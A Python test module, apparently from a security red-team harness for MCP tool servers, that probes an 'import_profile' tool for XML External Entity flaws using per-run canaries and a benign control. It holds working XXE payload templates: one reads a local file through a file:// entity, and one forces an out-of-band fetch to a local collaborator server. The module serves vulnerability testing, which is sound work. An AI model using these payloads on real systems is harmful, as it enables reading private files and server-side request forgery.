"""T11.2 / SAM1-22 — XML External Entity (XXE) probe (oracle-gated).

Classic impl bug: a tool parses attacker XML with external-entity resolution enabled.
Ground truth only: FIRES iff a per-run CANARY the attacker could not otherwise read is
returned — the victim file's contents (CWE-611) or an out-of-band fetch the attacker's OWN
collaborator recorded (CWE-918/SSRF). SafeHost resolves no external entity → never fires.
"""
from __future__ import annotations

import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from mcp_rt.mcp_client import StatelessHTTPClient, _result_text_2026

_FILE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{path}">]><r>&x;</r>'
_OOB_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{url}">]><r>&x;</r>'


def _call(url: str, xml_text: str) -> str:
    return _result_text_2026(StatelessHTTPClient(url).begin(
        "tools/call", {"name": "import_profile", "arguments": {"xml": xml_text}}))


def probe_file_xxe(url: str, tok: str, target_path: str) -> dict:
    text = _call(url, _FILE_PAYLOAD.format(path=target_path))   # the victim's local file
    fired = f"XXE-FILE-{tok}" in text
    return {"case": "file_xxe", "fired": fired, "evidence": text[:120]}


def probe_oob_xxe(url: str, tok: str) -> dict:
    hits: list[str] = []
    canary = f"OOB-{tok}".encode()

    class _Collab(BaseHTTPRequestHandler):   # the scanner's OWN collaborator (à la Burp Collaborator)
        def log_message(self, *a):
            pass

        def do_GET(self):
            hits.append(self.path)
            self.send_response(200); self.send_header("Content-Type", "text/xml")
            self.send_header("Content-Length", str(len(canary))); self.end_headers(); self.wfile.write(canary)

    collab = HTTPServer(("127.0.0.1", 0), _Collab)
    threading.Thread(target=collab.serve_forever, daemon=True).start()
    try:
        oob_url = f"http://127.0.0.1:{collab.server_address[1]}/{tok}"
        text = _call(url, _OOB_PAYLOAD.format(url=oob_url))
    finally:
        collab.shutdown()
    requested = any(f"/{tok}" in p for p in hits)   # server-side ground truth: the host made the outbound call
    reflected = f"OOB-{tok}" in text                 # exfil: the fetched bytes flowed back through the tool
    return {"case": "oob_xxe", "fired": requested and reflected,
            "requested": requested, "reflected": reflected, "evidence": text[:120]}


def probe_benign(url: str, tok: str) -> dict:
    text = _call(url, "<profile><name>ok</name></profile>")   # well-formed, no DTD
    completes = "imported profile:" in text and f"XXE-FILE-{tok}" not in text
    return {"case": "benign", "fired": False, "completes": completes, "evidence": text[:120]}
